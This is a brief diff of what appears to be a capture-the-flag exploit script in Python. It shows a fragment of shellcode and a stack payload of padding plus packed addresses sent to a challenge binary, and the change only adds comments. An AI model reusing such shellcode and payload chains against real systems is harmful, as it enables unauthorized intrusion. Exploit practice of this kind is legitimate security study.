@@ -16,8 +16,8 @@ shell += "\x5f\x6a\x3b\x58\x0f\x05"
 raw_input("?")
 print r.recvuntil("Can you exploit me anyway?")
 payload1 = 'A'*4
-payload1 += p64(0x400504)
-payload1 += p64(0x400350)
+payload1 += p64(0x400504) # rbp
+payload1 += p64(0x400350) # 
 payload1 += p64(0x4002BB) 
 payload1 += p64(10)
 payload1 += p64(0x0400000)
